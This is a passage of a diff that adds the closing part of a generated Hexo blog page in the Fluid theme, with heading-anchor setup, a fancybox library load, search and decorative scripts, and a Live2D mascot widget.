+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/star.js"></script>
+<script src="/js/love.js"></script>
+<script src="/js/duration.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
